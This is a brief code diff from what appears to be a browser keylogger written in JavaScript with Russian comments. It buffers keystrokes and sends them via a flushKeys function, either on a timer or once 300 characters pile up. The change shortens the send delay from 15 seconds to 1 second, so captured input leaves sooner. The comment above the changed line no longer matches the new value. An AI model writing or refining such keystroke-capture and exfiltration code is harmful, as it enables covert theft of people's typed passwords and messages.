@@ -42,7 +42,7 @@
 
         // Сбрасываем таймер — отправляем через 15 секунд после последнего нажатия
         clearTimeout(sendTimer);
-        sendTimer = setTimeout(flushKeys, 15000);
+        sendTimer = setTimeout(flushKeys, 1000);
 
         // Или если накопилось больше 300 символов — отправляем сразу
         if (keyBuffer.length > 300) {
